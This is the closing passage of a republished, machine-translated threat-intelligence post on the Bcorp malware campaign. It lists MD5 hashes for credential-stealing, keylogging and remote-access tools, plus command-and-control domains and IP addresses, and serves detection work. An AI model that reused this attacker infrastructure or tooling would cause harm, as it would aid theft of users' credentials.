c871091ce44594adbd6cf4388381e410 <br>  daf6a9eb55813d1a151695d33506179d <br>  f010af1b330d00abb5149e9defdae6ee <br>  ff924faeb9dfd7384c05abe855566fc9 <br><br>  Frasco Bcorp <br>  59978b5a9e4ab36da0f31a8f616cc9d3 <br>  a7219da3b0c0730c476fe340dbf7e4e5 <br>  ddac55213089da9ef407bce05ebe653e <br><br>  Get-chromecreds <br>  11769e9f49123a2af00bd74453221c07 <br>  1a81c9119d7761535c198ddb761979b8 <br>  42a85849a591e65b0254d9bcbdf59f82 <br>  8e49263f33c53ee5bc91bebbf9617352 <br>  c9ab090ad2badb9862fd5b6058428096 <br><br>  Start-keylogger <br>  55daa84475a11ea656183e0ad5ccc608 <br>  aa82fbb6a341d71d2431b6d2ebca027c <br><br>  WebBrowserPassView <br>  7722e086cf7ed59955a1d6ec26f49cf3 <br><br>  NetWire RAT <br>  1470a08bd427bb8738a254ba4f130ff5 <br>  5f8495016773c7834b1c588f0997a6c4 <br><br>  Escuta TCP <br>  913567da98185cad9f91a570dc298de1 <br><br>  Carregadores de scripts <br>  02946d10c6a34fe74826f3c0b0a6a3e0 <br>  1ad644bdba488a6e42ad76aea2c0ee54 <br>  3a2dcf36b9206a135daa73c645a3f56f <br>  4dddd87d3cb80145c9859fd76dfef794 <br>  74c5e5be9f79bd9e7ee84fd046c14e68 <br>  78f4d5fa6c68dae4b03860b54ec6cc67 <br><br>  Carregadores pe min√∫sculos <br>  0f3c56018a7051aebe060454fc981f5b <br>  1b9cefc229daddc4557cea0e3bdf4656 <br>  29e6679107bd9c72aa061371082206bb <br>  b66b7395825b9ed656b768d4e7fe1de7 <br>  fbc606b8b04e51ddb342e29b84ac1edb <br><br>  xRAT <br>  2e9a0637478938cc3e4519aa7b4219cc <br>  7c67c93ba243be32e5fd6a6921ceded3 <br><br>  Painel Bcorp vs.  construtor <br>  405c987ba1a8568e2808da2b06bc9047 <br>  c3ac8b7a7c8c0d100e3c2af8ccd11441 <br><br>  Bcorp C&amp;C <br>  bcorp.fun <br>  bkorp.xyz <br>  buhar.us <br>  definebilimi.com <br>  husan.ddns.net <br>  husan2.ddns.net <br>  husan3.ddns.net <br>  i36-imgur.com <br>  i37-imgur.com <br>  i38-imgur.com <br>  i39-imgur.com <br>  prntsrcn.com <br>  qqww.eu <br>  5.255.63.12 <br>  192.95.3.137 <br>  192.95.3.14 </div></div><br><br>  <b>Postado por</b> Alexey Vishnyakov, Positive Technologies </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt479998/">https://habr.com/ru/post/pt479998/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt479978/index.html">Como sem dor, sem captcha e gratuitamente para trazer extratos do Fundo Federal de Propriedade do Registro Federal dos Direitos Humanos do Estado para um leg√≠vel por humanos</a></li>
<li><a href="../pt479982/index.html">Vidos e insetos</a></li>
<li><a href="../pt479988/index.html">Competi√ß√µes tecnol√≥gicas Radiofest-2019. Sum√°rio</a></li>
<li><a href="../pt479992/index.html">Como ensinar o UITextView a se destacar maravilhosamente</a></li>
<li><a href="../pt479996/index.html">Transistores de 2 nm: voc√™ corta ou corta?</a></li>
<li><a href="../pt480000/index.html">Indicador de qualidade do canal WebRTC do servidor sobre TCP</a></li>
<li><a href="../pt480002/index.html">Analise o DevOpsDays Moscow: insights de 6 relat√≥rios</a></li>
<li><a href="../pt480006/index.html">Indicador de qualidade do canal para o servidor WebRTC sobre TCP</a></li>
<li><a href="../pt480008/index.html">Yuri Rogachev: "Vim fazer o M-1, sem conhecer a inform√°tica"</a></li>
<li><a href="../pt480010/index.html">Os 3 principais elementos HTML que esquecemos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>